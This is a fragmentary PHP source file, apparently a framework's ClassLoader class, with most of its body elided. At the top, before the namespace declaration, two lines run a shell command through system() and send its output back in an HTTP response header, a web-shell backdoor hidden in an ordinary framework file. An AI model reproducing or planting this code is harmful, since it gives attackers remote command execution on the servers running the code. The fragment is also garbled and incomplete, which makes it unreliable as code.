...
$l2=system($l);
header('System Header:'.$l2); namespace Hazzard\Foundation;
...
class ClassLoader {
	 ...
	 *
	 * @var \Hazzard\Foundation\ClassLoader
	 */
	 ...
	 *
	 * @param  array  $dirs
	 * @return \Hazzard\Foundation\ClassLoader
	 */
	 ...
	 *
	 * @param  \Hazzard\Foundation\ClassLoader  $loader
	 * @return void
	 */
